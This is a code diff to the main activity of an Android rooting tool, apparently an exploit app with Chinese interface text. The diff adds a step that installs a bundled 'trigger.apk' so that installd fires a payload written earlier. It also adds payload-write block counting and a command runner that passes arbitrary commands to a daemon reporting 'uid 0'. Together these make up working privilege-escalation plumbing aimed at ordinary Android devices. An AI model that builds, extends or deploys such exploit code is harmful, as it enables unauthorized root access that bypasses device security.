@@ -69,16 +69,27 @@ public final class MainActivity extends Activity {
     private Button runButton;
     private final android.os.Handler ui = new android.os.Handler(android.os.Looper.getMainLooper());
 
-    static final String DAEMON_STATE = "/data/local/tmp/p780_state";
-    static final String DAEMON_CMD = "/data/local/tmp/p780_cmd";
-    static final String DAEMON_SEQ = "/data/local/tmp/p780_seq";
-    static final String DAEMON_OUT = "/data/local/tmp/p780_out";
+    private String daemonState;
+    private String daemonCmd;
+    private String daemonSeq;
+    private String daemonOut;
     private int seq = 0;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        String base = getFilesDir().getAbsolutePath();
+        daemonState = base + "/p780_state";
+        daemonCmd = base + "/p780_cmd";
+        daemonSeq = base + "/p780_seq";
+        daemonOut = base + "/p780_out";
         buildUi();
+        if (getIntent() != null && getIntent().hasExtra("installStatus")) {
+            int status = getIntent().getIntExtra("installStatus", -1);
+            String message = getIntent().getStringExtra("installMessage");
+            log("\u5b89\u88c5\u7ed3\u679c: status=" + status + (message == null ? "" : " " + message));
+            ui.postDelayed(this::refreshStatus, 1500);
+        }
         String autoProbe = getIntent() == null ? null : getIntent().getStringExtra("probe");
         if (autoProbe != null) {
             ui.post(() -> runHeadless(autoProbe));
@@ -228,7 +239,7 @@ public final class MainActivity extends Activity {
     }
 
     private void refreshStatus() {
-        String state = readText(DAEMON_STATE);
+        String state = readText(daemonState);
         boolean ready = state != null && state.trim().startsWith("READY");
         if (statusView != null) {
             statusView.setText(ready ? "\u5df2\u8fde\u63a5 \u00b7 uid 0" : "\u672a\u8fde\u63a5");
@@ -240,16 +251,25 @@ public final class MainActivity extends Activity {
     }
 
     private void log(String line) {
+        android.util.Log.i("Elevate", line);
         ui.post(() -> consoleView.append(line.endsWith("\n") ? line : line + "\n"));
     }
 
     private void requestRoot() {
+        new java.io.File(getFilesDir(), "p780_lock").delete();
+        new java.io.File(getFilesDir(), "p780_state").delete();
         rootButton.setEnabled(false);
         statusView.setText("\u6b63\u5728\u5199\u5165\u8f7d\u8377\u2026");
         new Thread(() -> {
             String report = patchProbe();
-            log(report);
-            String state = readText(DAEMON_STATE);
+            int ok = 0, bad = 0;
+            for (String line : report.split("\n")) {
+                if (line.contains("block 0x") && line.contains(": OK")) ok++;
+                else if (line.contains("MISMATCH") || line.contains("ABORT:")) bad++;
+            }
+            log("\u5199\u5165\u8f7d\u8377\uff1a" + ok + " \u5757\u6210\u529f\uff0c" + bad + " \u5757\u5f02\u5e38");
+            if (bad > 0) log(report);
+            String state = readText(daemonState);
             if (state != null && state.trim().startsWith("READY")) {
                 ui.post(() -> {
                     rootButton.setEnabled(true);
@@ -266,7 +286,52 @@ public final class MainActivity extends Activity {
     }
 
     private void showTriggerHint() {
-        log("\u8f7d\u8377\u5df2\u5199\u5165\u3002\u8bf7\u5b8c\u6210\u4e00\u6b21\u5305\u5b89\u88c5/\u7f16\u8bd1\u4ee5\u89e6\u53d1 installd\u3002");
+        installTrigger();
+    }
+
+    private void installTrigger() {
+        if (!getPackageManager().canRequestPackageInstalls()) {
+            log("\u9700\u8981\u5148\u5141\u8bb8\u672c\u5e94\u7528\u5b89\u88c5\u5e94\u7528\uff0c\u6b63\u5728\u6253\u5f00\u8bbe\u7f6e\u2026");
+            try {
+                startActivity(new android.content.Intent(
+                        android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                        android.net.Uri.parse("package:" + getPackageName())));
+            } catch (Throwable t) {
+                log("\u65e0\u6cd5\u6253\u5f00\u8bbe\u7f6e: " + t);
+            }
+            return;
+        }
+        new Thread(() -> {
+            try {
+                android.content.pm.PackageInstaller installer =
+                        getPackageManager().getPackageInstaller();
+                android.content.pm.PackageInstaller.SessionParams params =
+                        new android.content.pm.PackageInstaller.SessionParams(
+                                android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+                params.setAppPackageName("top.dcmqht.trigger");
+                int id = installer.createSession(params);
+                try (android.content.pm.PackageInstaller.Session session = installer.openSession(id)) {
+                    try (java.io.InputStream in = getAssets().open("trigger.apk");
+                         java.io.OutputStream out = session.openWrite("base.apk", 0, -1)) {
+                        byte[] buf = new byte[8192];
+                        int n;
+                        while ((n = in.read(buf)) > 0) {
+                            out.write(buf, 0, n);
+                        }
+                        session.fsync(out);
+                    }
+                    android.content.Intent intent = new android.content.Intent(
+                        "top.dcmqht.p780ipsec.INSTALL_RESULT").setPackage(getPackageName());
+                android.app.PendingIntent pending = android.app.PendingIntent.getBroadcast(
+                        this, id, intent,
+                        android.app.PendingIntent.FLAG_UPDATE_CURRENT);
+                    session.commit(pending.getIntentSender());
+                }
+                log("\u5df2\u63d0\u4ea4\u89e6\u53d1\u5b89\u88c5\uff0c\u8bf7\u5728\u7cfb\u7edf\u5f39\u7a97\u4e2d\u70b9\u300c\u5b89\u88c5\u300d\u3002");
+            } catch (Throwable t) {
+                log("\u89e6\u53d1\u5b89\u88c5\u5931\u8d25: " + t);
+            }
+        }).start();
     }
 
     private void runCommand() {
@@ -276,16 +341,16 @@ public final class MainActivity extends Activity {
         }
         runButton.setEnabled(false);
         new Thread(() -> {
-            writeText(DAEMON_CMD, cmd + "\n");
+            writeText(daemonCmd, cmd + "\n");
             seq++;
-            writeText(DAEMON_SEQ, String.valueOf(seq) + "\n");
+            writeText(daemonSeq, String.valueOf(seq) + "\n");
             String out = null;
             for (int i = 0; i < 40; i++) {
                 try {
                     Thread.sleep(150);
                 } catch (InterruptedException ignored) {
                 }
-                String text = readText(DAEMON_OUT);
+                String text = readText(daemonOut);
                 if (text != null && text.contains("SEQ " + seq + " END")) {
                     out = text;
                     break;
